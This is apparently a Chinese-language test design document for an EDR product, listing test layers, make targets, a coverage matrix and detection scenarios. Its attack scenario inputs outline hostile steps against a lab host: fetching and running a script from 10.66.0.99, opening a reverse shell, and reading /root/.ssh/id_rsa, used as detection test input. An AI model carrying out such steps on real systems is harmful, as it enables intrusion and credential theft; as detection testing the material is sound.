# SysArmor Next 测试设计与脚本实践

> 配套 [design-essentials.md](design-essentials.md)。本文只描述当前 `test/` 目录里的真实测试逻辑、脚本入口、覆盖状态和下一步缺口。

一句话原则：**测试不是证明脚本能跑完,而是证明一条产品契约成立:给定拓扑、策略、运行时状态和攻击/故障输入,系统必须产出或不产出指定事实,并能通过 manager / sysarmorctl 查询验证。**

---

## 一、当前测试分层

当前测试分四层,从便宜到昂贵:

| 层级 | 目的 | 主要入口 | 成本 |
|---|---|---|---|
| 单元/包测试 | 验证代码内部状态机和接口 | `go test ./...` | 低 |
| local agent runtime | 用 fake sensor 验证 agent、spool、retry、health、manager 查询 | `make -C test e2e-agent-all` | 中 |
| container detection/runtime | 用 Docker + real Tetragon 验证容器 scope 检测链路 | `make -C test e2e-agent-detection-container-all`、`make -C test e2e-agent-real-tetragon-owned-container` | 高 |
| VM owned runtime | 用 Vagrant VM + real Tetragon 验证 VM/systemd/host scope | `make -C test e2e-agent-real-tetragon-owned-vm` | 最高 |

日常判断:

- 改普通 Go 逻辑:先跑 `go test ./...`。
- 改 agent runtime、spool、health、upload:跑 `make -C test e2e-agent-all`。
- 改检测规则、normalize、analytics:跑 `make -C test e2e-agent-detection-container-all`。
- 改 Tetragon backend、runtime policy、scope、VM/systemd:跑 `make -C test e2e-agent-runtime-all`。

---

## 二、`test/` 目录和职责

```text
test/
  Makefile              统一入口
  README.md             测试环境快速说明
  SCENARIOS.md          场景输入/输出样例说明

  env/
    container/          Docker Compose 拓扑
    vm/                 Vagrant + libvirt 拓扑
    resources/          replay/debug/perf 兼容资源

  scenarios/
    container/          容器场景 attack.sh + expected.yaml
    vm/                 VM 场景 attack.sh + expected.yaml

  policies/             策略契约样例;当前完整 policy 下发闭环尚未落地

  harness/
    start-*.sh          启动拓扑
    stop-*.sh           停止拓扑
    capture-*.sh        通用场景采集入口
    e2e-*.sh            端到端门禁脚本
    perf-*.sh           性能/资源采样脚本
    assert.py           旧通用断言入口
    report.py           汇总已有结果

  .results/             生成物,不是测试源文件
```

注意:

- `.results/` 和 `harness/__pycache__/` 是生成物,不应作为测试设计来源。
- `capture-container.sh` / `capture-vm.sh` 默认已经是 agent-managed 主路径。
- `CAPTURE_MODE=replay` 是兼容调试路径,不是当前主门禁。
- `test/policies/*.yaml` 是策略契约样例;当前大多数 e2e 脚本仍会在临时目录里写最小 `policy.yaml`。

---

## 三、核心测试逻辑

当前测试证明的是一条 EDR endpoint runtime 主链路:

```text
attack / fault input
  -> sensor runtime
  -> sysarmor-agent
  -> spool / upload
  -> sysarmor-manager
  -> analytics / store
  -> sysarmorctl query
  -> harness assertion
```

测试脚本不应该只看进程退出码,还要看 manager 查询结果:

- `events`: 原始/规范化事件是否进入 manager。
- `signals`: endpoint/cloud signal 是否出现或不出现。
- `incidents`: 是否形成 incident。
- `agent-health`: sensor、queue、upload、capability、scope 是否可见。
- `metrics`: ingest、retry、backpressure 等计数是否符合预期。

---

## 四、当前主门禁

### 4.1 单测

```bash
go test ./...
```

覆盖:

- agent config、daemon、sensor runtime。
- Tetragon backend。
- durable spool、upload worker、retry/recovery。
- manager ingest/store/idempotency。
- Link1 HTTP/gRPC upload。
- sysarmorctl 查询。

### 4.2 Runtime 总门禁

```bash
make -C test e2e-agent-runtime-all
```

实际展开:

```text
e2e-agent-all
  -> local fake sensor runtime / reliability / health

e2e-agent-detection-container-all
  -> container apt-fileless-c2
  -> container apt-staged-drop
  -> container benign-ci-noise

e2e-agent-real-tetragon-owned-container
  -> container real Tetragon owned process/runtime policy

e2e-agent-real-tetragon-owned-vm
  -> VM systemd + real Tetragon owned process/runtime policy
```

这是当前最接近“端到端已闭环”的门禁。

---

## 五、脚本到能力的映射

### 5.1 Local Runtime / Reliability

这些脚本大多在本机临时目录启动 manager + agent,用 fake sensor 或 fake Tetragon bundle 降低成本。

| Make target | 脚本 | 证明什么 |
|---|---|---|
| `e2e-manager-idempotency` | `harness/e2e-manager-idempotency.sh` | 重复 batch 不放大 events/signals/incidents |
| `e2e-agent-daemon` | `harness/e2e-agent-daemon.sh` | agent daemon 能启动、上传、被 manager 查询 |
| `e2e-agent-sensor-restart` | `harness/e2e-agent-sensor-restart.sh` | sensor crash 后 agent 能重启并上报 tamper/degraded |
| `e2e-agent-sensor-recover` | `harness/e2e-agent-sensor-recover.sh` | sensor 从 degraded 恢复到 ok/running |
| `e2e-agent-spool` | `harness/e2e-agent-spool.sh` | manager outage 时数据进入 spool,恢复后 drain |
| `e2e-agent-outage-soak` | `harness/e2e-agent-outage-soak.sh` | 多 batch outage 后不丢、不放大 |
| `e2e-agent-shutdown` | `harness/e2e-agent-shutdown.sh` | SIGTERM 时 flush 已进入 spool 的数据 |
| `e2e-agent-restart-unacked` | `harness/e2e-agent-restart-unacked.sh` | ack 不匹配不误删,agent restart 后仍能重传 |
| `e2e-agent-retry-backoff` | `harness/e2e-agent-retry-backoff.sh` | transient 503 会 retry/backoff,不是 busy loop |
| `e2e-agent-capability*` | `harness/e2e-agent-capability*.sh` | binary/BTF/bpffs 缺失时 health degraded 可见 |
| `e2e-agent-parse-health` | `harness/e2e-agent-parse-health.sh` | parse error 进入 health,并产生 blindness/tamper signal |
| `e2e-agent-dropped-health` | `harness/e2e-agent-dropped-health.sh` | dropped events 进入 health,并产生 blindness/tamper signal |
| `e2e-agent-backpressure` | `harness/e2e-agent-backpressure.sh` | spool max_bytes 触发 backpressure/drop/degraded |
| `e2e-agent-health` | `harness/e2e-agent-health.sh` | agents / agent-health / metrics 查询可用 |
| `e2e-agent-reliability-soak` | `harness/e2e-agent-reliability-soak.sh` | 串联 outage/retry/restart/shutdown 的长一点可靠性 smoke |

聚合入口:

```bash
make -C test e2e-agent-all
```

### 5.2 Container Detection

这些脚本启动 Docker 拓扑,在 `tetragon` 容器中运行 `sysarmor-agent`,通过 container scope 过滤 `node-a` 的事件。

| Make target | 脚本 | 场景 | 证明什么 |
|---|---|---|---|
| `e2e-agent-apt-container` | `harness/e2e-agent-apt-container.sh` | `apt-fileless-c2-managed` | 高置信攻击产生 endpoint signal、cloud signal、incident |
| `e2e-agent-staged-container` | `harness/e2e-agent-staged-container.sh` | `apt-staged-drop-managed` | 跨 lineage 场景能靠云端图收敛成 incident |
| `e2e-agent-benign-container` | `harness/e2e-agent-benign-container.sh` | `benign-ci-noise-managed` | 良性 CI 噪音 incident=0, additive 对照可误报 |

聚合入口:

```bash
make -C test e2e-agent-detection-container-all
```

### 5.3 Policy / Rule Content

这些脚本验证 v3 控制面第一阶段:规则内容和策略能被 manager 管理、分配,并影响 cloud analytics。

| Make target | 脚本 | 证明什么 |
|---|---|---|
| `e2e-policy-endpoint-disable` | `harness/e2e-policy-endpoint-disable.sh` | 创建 policy、分配给 agent、agent 启动拉取 effective policy、禁用 endpoint rule 后不产生对应 endpoint signal |
| `e2e-policy-agent-refresh` | `harness/e2e-policy-agent-refresh.sh` | agent 运行中刷新 effective policy,无需重启即可禁用 endpoint rule |
| `e2e-policy-cloud-disable` | `harness/e2e-policy-cloud-disable.sh` | 创建 policy、分配给 agent、查询 effective policy、禁用 cloud rule 后不产生 cloud signal/incident |
| `e2e-policy-all` | Make 聚合 | 当前聚合 endpoint/cloud policy gate |

Go 单测同时覆盖:

- manager policy API / effective policy resolution。
- agent 启动拉取 effective policy,并将 endpoint rule references 应用到 endpoint rule engine。
- agent 周期性刷新 effective policy,并在规则引用变化后切换 endpoint rule engine。
- agent health 中的 policy id/version/mode 字段。

聚合入口:

```bash
make -C test e2e-policy-all
```

### 5.4 Response / Enforce

这些脚本验证 v3 response/enforce 的 observe-only 骨架:manager 能创建 response command,agent 能接收并以非破坏方式返回 ack,manager 能持久化审计记录。需要人工确认的命令可以先停在 `pending_approval`,不会进入 agent pending/downlink,审批通过后才会变成可执行的 pending。

| Make target | 脚本 | 证明什么 |
|---|---|---|
| `e2e-response-observe-only` | `harness/e2e-response-observe-only.sh` | 创建 observe response command、agent 返回 observe-only ack、audit 可查询 |
| `e2e-response-policy-deny` | `harness/e2e-response-policy-deny.sh` | destructive action 默认被 manager 拒绝、audit 标记 denied、不会进入 pending |
| `e2e-response-scope-deny` | `harness/e2e-response-scope-deny.sh` | response command 的显式 scope 必须匹配 agent health runtime scope,否则 denied 且不进入 pending |
| `e2e-response-audit` | `harness/e2e-response-audit.sh` | terminal signal 的结构化 response intent 可转换为 observe-only response decision,并进入 audit |
| `e2e-response-approval` | `harness/e2e-response-approval.sh` | `approval_required` command 先进入 `pending_approval`,审批前不会 pending,审批后进入 pending |
| `e2e-response-all` | Make 聚合 | 当前聚合 response/enforce observe-only gate |

聚合入口:

```bash
make -C test e2e-response-all
```

### 5.5 Graph / Evidence / Incident

这些脚本验证 v3 graph/evidence/incident 地基:incident evidence 不是只返回散装节点,而是能通过 graph/evidence 包生成可查询的 evidence subgraph;incident 也开始具备最小 lifecycle 状态。

| Make target | 脚本 | 证明什么 |
|---|---|---|
| `e2e-graph-evidence` | `harness/e2e-graph-evidence.sh` | staged-drop 的共享 file 节点和 file -> socket connect edge 可通过 incident evidence graph JSON、shortest path、k-hop 查询 |
| `e2e-incident-lifecycle` | `harness/e2e-incident-lifecycle.sh` | incident 可 suppress / close / reopen,状态、原因和 actor 可查询 |
| `e2e-incident-attach-evidence` | `harness/e2e-incident-attach-evidence.sh` | incident 可追加 evidence node/edge,并通过 incident evidence graph 查询 |
| `e2e-incident-merge` | `harness/e2e-incident-merge.sh` | incident 可按显式 id 合并,source evidence/lineage 进入 target,source incident 被移除 |
| `e2e-graph-all` | Make 聚合 | 当前聚合 graph/evidence/incident gate |

聚合入口:

```bash
make -C test e2e-graph-all
```

### 5.6 Store / Postgres Foundation

这些脚本验证 v3 durable store/query 的早期地基:manager 能报告当前 store backend、state/migration version,Postgres schema version 已进入代码和门禁,migration runner 有单测覆盖,查询 API 也有最小分页 contract。Postgres 已有 JSON snapshot adapter 过渡路径,可通过 `database/sql` driver 持久化完整 manager state;逐表 Postgres adapter 和 live Postgres e2e 仍是后续项。

| Make target | 脚本 | 证明什么 |
|---|---|---|
| `e2e-store-status` | `harness/e2e-store-status.sh` | manager file backend、state version、migration version、Postgres schema version 可通过 CLI 查询 |
| `e2e-query-pagination` | `harness/e2e-query-pagination.sh` | events/signals 查询可通过 `limit` / `offset` 返回稳定分页 |
| `e2e-postgres-store` | Go backend adapter test | Postgres backend 会运行 migration,打开 snapshot-backed store,并能跨 reopen 保留 response audit |
| `e2e-postgres-all` | Make 聚合 | 当前聚合 store/Postgres foundation gate |

聚合入口:

```bash
make -C test e2e-postgres-all
```

### 5.7 Link1 Stream Foundation

这些脚本验证 v3 Link1 stream 的早期地基:manager 已经能维护 session state 和 last ack cursor,agent 也能在启动上传 worker 时按 resume cursor 清理本地 spool,downlink 能表达 resume、policy、response 和 evidence pullback 请求,uplink 也能回传 evidence pullback result,已有最小 gRPC bidirectional stream RPC 承载这些 frame 语义,agent uploader 也能通过 stream 上传 batch,agent 可通过 stream downlink 拉取并应用 effective policy,也可拉取 response command 并回写 observe-only ack。agent 对 evidence pullback 已有最小自动处理:拉取 request、回传 target evidence subgraph、manager 完成 pullback 并把 evidence 附加到 incident。

| Make target | 脚本 | 证明什么 |
|---|---|---|
| `e2e-link1-session` | `harness/e2e-link1-session.sh` | 同一 agent 连续 upload 会更新 Link1 session,`last_ack_cursor` 前进到最新 batch,并可通过 resume API 查询 |
| `e2e-link1-downlink` | `harness/e2e-link1-downlink.sh` | Link1 downlink frame 可返回 effective policy update、pending response command 和 evidence pullback request |
| `e2e-link1-frames` | `harness/e2e-link1-frames.sh` | Link1 uplink frame 可提交 upload、health、ack、evidence pullback result、error,并落到 session、health、response audit、pullback 状态 |
| `e2e-link1-grpc-stream` | Go stream contract test | gRPC bidi stream 可先发 hello 获取 downlink frames,再通过同一 stream 提交 upload frame 并推进 session cursor |
| `e2e-link1-stream-upload` | Go stream uploader test | agent uploader 可通过 Link1 gRPC stream 上传 batch,manager session cursor 记录为 stream transport |
| `e2e-link1-stream-resume` | Go stream resume test | agent 可通过 Link1 stream downlink 获取 resume cursor,启动时删除 cursor 及之前的本地 spool batch |
| `e2e-link1-policy-downlink` | Go stream policy test | agent 可通过 Link1 stream downlink 拉取 effective policy,并获得 endpoint rule references |
| `e2e-link1-response-command` | Go stream response test | agent 可通过 Link1 stream downlink 拉取 response command,执行 observe-only ack 并回写 response audit |
| `e2e-link1-evidence-pullback` | Go stream evidence test | agent 可通过 Link1 stream downlink 拉取 evidence pullback request,回写 target evidence subgraph,result 完成后 incident evidence 可查询 |
| `e2e-link1-stream-all` | Make 聚合 | 当前聚合 Link1 session/cursor foundation gate |

聚合入口:

```bash
make -C test e2e-link1-stream-all
```

### 5.8 Container / VM Runtime Ownership

这些脚本证明 agent 不只是读取现成事件,而是拥有 sensor process、Tetra subscription 和 runtime policy。

| Make target | 脚本 | 证明什么 |
|---|---|---|
| `e2e-agent-managed-container` | `harness/e2e-agent-managed-container.sh` | container fake Tetragon bundle 能被 agent 托管 |
| `e2e-agent-managed-restart-container` | `harness/e2e-agent-managed-restart-container.sh` | container fake sensor crash 后可观测 |
| `e2e-agent-managed-recover-container` | `harness/e2e-agent-managed-recover-container.sh` | container fake sensor 能从 degraded 恢复 |
| `e2e-agent-systemd-vm` | `harness/e2e-agent-systemd-vm.sh` | VM systemd agent 能安装、启动、restart、查询 health |
| `e2e-agent-managed-vm` | `harness/e2e-agent-managed-vm.sh` | VM fake Tetragon bundle 能被 systemd agent 托管 |
| `e2e-agent-managed-recover-vm` | `harness/e2e-agent-managed-recover-vm.sh` | VM fake sensor 能从 degraded 恢复 |
| `e2e-agent-real-tetragon-vm` | `harness/e2e-agent-real-tetragon-vm.sh` | VM 上 agent 订阅真实 Tetragon 事件 |
| `e2e-agent-real-tetragon-owned-container` | `harness/e2e-agent-real-tetragon-owned-container.sh` | container 中 agent-owned real Tetragon process + policy + cleanup |
| `e2e-agent-real-tetragon-owned-vm` | `harness/e2e-agent-real-tetragon-owned-vm.sh` | VM 中 agent-owned real Tetragon process + policy + systemd recovery |

当前 runtime 总门禁只聚合最关键的 owned container / owned VM,不是把所有 managed smoke 都塞进去。

### 5.9 通用 Capture / Replay

通用入口:

```bash
make -C test e2e TOPO=container SCENARIO=apt-fileless-c2
make -C test e2e TOPO=vm SCENARIO=apt-fileless-c2
```

实际流程:

```text
make up
  -> harness/start-<topo>.sh

make capture
  -> harness/capture-<topo>.sh <scenario> <duration>

make assert
  -> harness/assert.py --expected scenarios/<topo>/<scenario>/expected.yaml
```

现状:

- 默认 `CAPTURE_MODE=managed`,走 agent-managed sensor 主路径。
- `CAPTURE_MODE=replay` 保留 v1 调试兼容:直接 `tetra getevents` + stream/replay。
- `expected.yaml` 是场景契约,但当前最硬的断言主要在专门的 `e2e-agent-*.sh` 里。

### 5.8 性能 / 资源

| Make target | 脚本 | 当前能证明什么 | 不能证明什么 |
|---|---|---|---|
| `perf` | `harness/perf-getevents.sh` | `tetra getevents` 短窗口 events/EPS/RSS baseline | 不能证明业务无干扰 |
| `perf-resource` | `harness/perf-resource.sh` | container/VM 中 agent、Tetragon、tetra、workload 的 CPU/RSS 时间序列 | 还没有业务延迟/吞吐 baseline 对照 |

使用:

```bash
make -C test perf TOPO=container DUR=10
make -C test perf TOPO=vm DUR=10

make -C test perf-resource TOPO=container SCENARIO=edr-idle DUR=60
make -C test perf-resource TOPO=vm SCENARIO=edr-idle DUR=60
```

资源测试下一步应该补:

- `baseline`: 不启 EDR,只跑业务。
- `edr-idle`: EDR 常驻空闲。
- `edr-business`: EDR + 正常业务负载。
- `edr-detection`: EDR + 攻击/高事件场景。
- `edr-soak`: 长窗口看内存增长、spool、dropped events。

---

## 六、三类核心场景

### 6.1 `apt-fileless-c2`

命题: 单 lineage 内的高置信攻击应该被检出并成案。

输入:

```text
curl 10.66.0.99:8080/x.sh
  -> bash /dev/shm/x.sh
  -> reverse shell 10.66.0.99:443
  -> read /root/.ssh/id_rsa
```

当前硬门禁:

```bash
make -C test e2e-agent-apt-container
```

断言:

- manager 能查到该 scenario 的 events。
- endpoint signal 包含 `reverse_shell_pattern` 和 `payload_dropped`。
- cloud signal 包含 `dropped_payload_executed_and_connects` 和 `web_shell_chain`。
- incident 存在,method 为 `rarity+causal-topk`。

### 6.2 `apt-staged-drop`

命题: 两阶段攻击分属不同 lineage,端侧不一定 terminal,云端应通过共享实体收敛成案。

输入:

```text
lineage A: curl helper -> /var/lib/app/plugins/helper
lineage B: helper --report 10.66.0.99:443
```

当前硬门禁:

```bash
make -C test e2e-agent-staged-container
make -C test e2e-agent-real-tetragon-owned-container
make -C test e2e-agent-real-tetragon-owned-vm
```

断言:

- scenario events 可查询。
- cloud signal 包含 `dropped_payload_executed_and_connects`。
- incident 存在。
- real owned path 中 runtime policy 和 owned process lifecycle 可验证。

### 6.3 `benign-ci-noise`

命题: 与攻击同形的良性 CI 噪音不能误报;裸加模式可作为反例。

输入:

```text
CI loop:
  curl dependency
  compile/write artifact
  repeat
```

当前硬门禁:

```bash
make -C test e2e-agent-benign-container
```

断言:

- normal mode incident=0。
- terminal signal=0。
- additive threshold recompute 能触发误报对照。

---

## 七、当前覆盖矩阵

| 能力 | 当前脚本覆盖 | 状态 |
|---|---|---|
| endpoint -> manager -> signal -> incident | container 三场景 | 已覆盖 |
| container workload scope 过滤 | container detection scripts + health scope | 已覆盖 |
| VM/systemd agent | `e2e-agent-systemd-vm`, owned VM | 已覆盖 |
| agent-owned real Tetragon process | owned container / owned VM | 已覆盖 |
| runtime policy apply/verify | owned container / owned VM 查 `sysarmor-runtime-collection` | 已覆盖 |
| agent stop/service stop cleanup | owned container / owned VM 查 `tetra getevents` 不残留 | 已覆盖 |
| manager outage + spool drain | `e2e-agent-spool`, `e2e-agent-outage-soak` | 已覆盖 |
| retry/backoff | `e2e-agent-retry-backoff` | 已覆盖 |
| restart unacked recovery | `e2e-agent-restart-unacked` | 已覆盖 |
| graceful shutdown drain | `e2e-agent-shutdown` | 已覆盖 |
| manager idempotency | `e2e-manager-idempotency` | 已覆盖 |
| capability degraded | `e2e-agent-capability*` | 已覆盖 |
| parse/dropped/backpressure health | parse/dropped/backpressure scripts | 已覆盖 |
| resource CPU/RSS sampling | `perf-resource` | 部分覆盖 |
| business impact baseline | 无稳定业务压测器/阈值 | 未覆盖 |
| policy/rule content 管理与分配 | manager policy API + `e2e-policy-cloud-disable` | 部分覆盖 |
| endpoint policy 启动拉取与应用 | daemon effective-policy 单测 + `e2e-policy-endpoint-disable` | 已覆盖 |
| endpoint policy 周期刷新 | daemon refresh 单测 + `e2e-policy-agent-refresh` | 已覆盖 |
| Link1 policy downlink signal | `e2e-link1-policy-downlink` + stream policy client 单测 | 部分覆盖 |
| signal response intent 字段 | endpoint fastpath 单测 + `e2e-response-audit` | 部分覆盖 |
| response intent -> decision | `e2e-response-audit` | 部分覆盖 |
| response/enforce observe-only audit | `e2e-response-observe-only` | 部分覆盖 |
| response destructive action deny | `e2e-response-policy-deny` | 部分覆盖 |
| response allowed scopes | `e2e-response-scope-deny` | 部分覆盖 |
| response approval requirement | `e2e-response-approval` + store 单测 | 部分覆盖 |
| analytics correlate/converge/incident/rarity 包边界 | correlate/converge/incident/rarity 单测 + graph 聚合门禁 | 部分覆盖 |
| count-based rarity MVP | rarity 单测 | 部分覆盖 |
| graph/evidence subgraph/path/k-hop query | `e2e-graph-evidence` | 部分覆盖 |
| incident lifecycle close/suppress/reopen | `e2e-incident-lifecycle` | 部分覆盖 |
| incident lifecycle attach evidence | `e2e-incident-attach-evidence` + store 单测 | 部分覆盖 |
| incident lifecycle merge | `e2e-incident-merge` + store 单测 | 部分覆盖 |
| Postgres schema + migration runner + store backend 可观测 | `e2e-store-status` + migration/runner 单测 | 部分覆盖 |
| query pagination | `e2e-query-pagination` + HTTP 单测 | 部分覆盖 |
| Postgres durable store adapter | `e2e-postgres-store` + backend/postgres 单测 | 部分覆盖 |
| Link1 session state / ack cursor | `e2e-link1-session` + store/HTTP 单测 | 部分覆盖 |
| Link1 resume cursor / local spool cleanup | `e2e-link1-session` / `e2e-link1-stream-resume` + agent resume client / uploadworker / spool 单测 | 部分覆盖 |
| Link1 downlink frame contract | `e2e-link1-downlink` + HTTP/gRPC 单测 | 部分覆盖 |
| Link1 evidence pullback request/result | `e2e-link1-downlink` / `e2e-link1-frames` / `e2e-link1-evidence-pullback` + HTTP/CLI/store 单测 | 部分覆盖 |
| Link1 uplink frame contract | `e2e-link1-frames` + HTTP 单测 | 部分覆盖 |
| Link1 bidirectional stream/downlink | `e2e-link1-grpc-stream` / `e2e-link1-stream-resume` + gRPC 单测 | 部分覆盖 |
| XDR 多源 ingestion | endpoint only | 未覆盖 |

---

## 八、对齐结论

当前 `test/` 与本文档的对齐状态:

- **已对齐**: runtime、reliability、container detection、owned container/VM、health、短窗口性能和资源采样都有真实脚本入口。
- **部分对齐**: 通用 `capture/assert/report` 还保留历史 replay/Phase1 表述,当前最可靠断言在专门 e2e 脚本里。
- **已修正**: `test/policies/README.md` 和 `test/SCENARIOS.md` 已更新为当前口径:agent-managed 主路径已存在,完整 policy/rule content 控制面仍未闭环。
- **未覆盖**: 业务无干扰评估、完整 Postgres adapter、Link1 双向 stream、XDR adapters。

所以当前可以客观说:

```text
SysArmor Next 已经有 EDR endpoint runtime 的端到端测试闭环。
它能证明采集、检测、可靠上报、health 可观测、container/VM owned runtime 成立。
它还不能证明完整 EDR platform 的策略运营、响应审计、图证据生命周期、持久化平台存储和 XDR 多源接入。
```

---

## 九、推荐执行顺序

### 日常开发

```bash
go test ./...
make -C test e2e-agent-all
```

### 检测逻辑变更

```bash
go test ./...
make -C test e2e-agent-detection-container-all
```

### Runtime / Sensor / Scope 变更

```bash
go test ./...
make -C test e2e-agent-runtime-all
```

### Release / 里程碑

```bash
go test ./...
make -C test e2e-agent-runtime-all
make -C test perf-resource TOPO=container SCENARIO=edr-idle DUR=60
make -C test perf-resource TOPO=vm SCENARIO=edr-idle DUR=60
```

后续能力成熟后再加入:

```bash
make -C test e2e-policy-all
make -C test e2e-response-all
make -C test e2e-graph-all
make -C test e2e-postgres-all
make -C test e2e-link1-stream-all
make -C test perf-resource-all
```
